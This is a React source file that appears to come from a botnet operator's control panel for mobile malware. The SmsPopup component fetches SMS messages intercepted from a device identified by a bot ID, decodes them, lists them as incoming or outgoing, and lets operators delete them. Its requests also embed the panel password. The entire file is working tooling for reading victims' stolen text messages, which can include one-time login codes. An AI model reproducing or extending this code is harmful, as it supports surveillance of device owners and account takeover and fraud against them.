import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, Switch, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faClock, faArrowDown, faArrowUp } from '@fortawesome/free-solid-svg-icons';


export default function SmsPopup(props) {


    const { customer, title, children, openPopup, setOpenPopup, onClose, smsrequest, setsmsrequest} = props;


    const [list, setList] = useState([]);

    const buttoncolor = "primary.main"

    const rootStyle = {
        display: 'flex',
        flexDirection: 'column',
        padding: '25px',
    };

    const smallBoxStyle = {
        marginBottom: '25px'
    };

    const tworoundstyle = {
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
    };

      const getLogs = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params':  new Buffer ('{"request":"getLogsSMS","idbot":"' + customer.id + '","password":"' + SettingsContext.password + ' "}').toString('base64')
          }
        });
    
        request.done(function(msg) {
          let response = (JSON.parse(msg))

          if (!response.hasOwnProperty('error')) {

            let array = response.sms

            function decodeBase64Texts(arr) {
              return arr.map((item) => {
                const keys = Object.keys(item);
                const decodedKeys = keys.map((key) => {
                  if (key === "logs") {
                    return { [key]: atob(item[key]) };
                  }
                  return { [key]: item[key] };
                });
                return Object.assign({}, ...decodedKeys);
              });
            }
            
            array = decodeBase64Texts(array)

            const filteredArray = array.filter((item) => {
              if (item.hasOwnProperty('logs') && (item.logs).includes("SMS") && (item.logs).includes("Input")) {
                let cut = "in: " + ((item.logs).substring(11)).replace(" Text:", " => ")
                item.logs = cut
                return true;
              }
              return false;
            });

            const filteredArray2 = array.filter((item) => {
              if (item.hasOwnProperty('logs') && (item.logs).includes("SMS") && (item.logs).includes("Output")) {
                let cut = ((item.logs).substring(11)).replace("text:", " => ")
                item.logs = cut
                return true;
              }
              return false;
            });

            setList(filteredArray.concat(filteredArray2))

          }
          
        }.bind(this));
    
        
      };

      const deleteLogs = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params':  new Buffer ('{"request":"deleteLogsSMS","idbot":"' + customer.id + '","password":"' + SettingsContext.password + ' "}').toString('base64')
          }
        });

        setList([])
        
      };

      if (openPopup && !smsrequest) {
        getLogs()
        setsmsrequest(true)
      }


    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>
                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <UserIcon width={20} height={23}/> 
                        </SvgIcon>
                        <Typography ml={0.5}>{customer.id}</Typography>
                        
                    </Box>

                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={180}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faCommentSms}/>
                        </SvgIcon>
                        <Typography ml={1}>SMS</Typography>
                        
                    </Box>
                    
                    <Button
                    onClick={getLogs}
                      sx={{borderRadius: "10px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faArrowsRotate} />
                      )}
                      variant="contained"
                    >
                      Reload
                    </Button>
                    
                    <Button
                    disabled={SettingsContext.user.role === "user"}
                    onClick={deleteLogs}
                    sx={{borderRadius: "10px", marginLeft: "15px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faTrashCan} />
                      )}
                      variant="contained"
                    >
                      Delete All SMS
                    </Button>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x" color={buttoncolor}/>
                    </Button>
                    </div>
                    {list.length > 0 ? (
                    <List>
                    {list.map((item, index) => (
                        <ListItem key={item}>
                        <Tooltip title={"Device: " + item.datetodevice + "\nServer: " + item.datetoserver}>
                        <ListItemAvatar>
                          {item.logs.includes("in: ") && <FontAwesomeIcon icon={faArrowDown} size="2x"/>}
                          {!(item.logs.includes("in: ")) && <FontAwesomeIcon icon={faArrowUp} size="2x"/>}
                            
                        </ListItemAvatar>
                        </Tooltip>
                        {item.logs.includes("in: ") && <ListItemText primary={item.logs.substring(4)} secondary={item.datetoserver} />}
                        {!(item.logs.includes("in: ")) && <ListItemText primary={item.logs} secondary={item.datetoserver} />}
                        </ListItem>
                    ))}
                    </List>
                    ) : (
                        <p>No data avaliable.</p>
                    )}

            </DialogContent>
        </Dialog>
    )
}
